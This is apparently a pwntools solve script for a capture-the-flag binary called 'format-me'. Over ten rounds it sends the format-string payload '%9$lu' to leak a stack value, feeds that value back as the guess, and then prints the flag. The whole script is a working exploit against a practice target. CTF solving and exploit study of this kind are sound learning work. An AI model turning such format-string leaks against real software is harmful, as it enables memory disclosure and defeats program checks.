#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("format-me")

r = process([exe.path])
#r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for i in range(10):
    r.recvuntil(b"Recipient? ")
    
    r.sendline(b"%9$lu")
    
    r.recvuntil(b"Sending to ")
    leak = r.recvline()
    
    val = leak.strip()
    
    r.recvuntil(b"Guess? ")
    
    r.sendline(val)
    
    r.recvuntil(b"Correct")
    
    print(f"[+] Round {i+1}/10 completed")

r.recvuntil(b"Here's your flag: ")
print(r.recvline().decode())
r.close()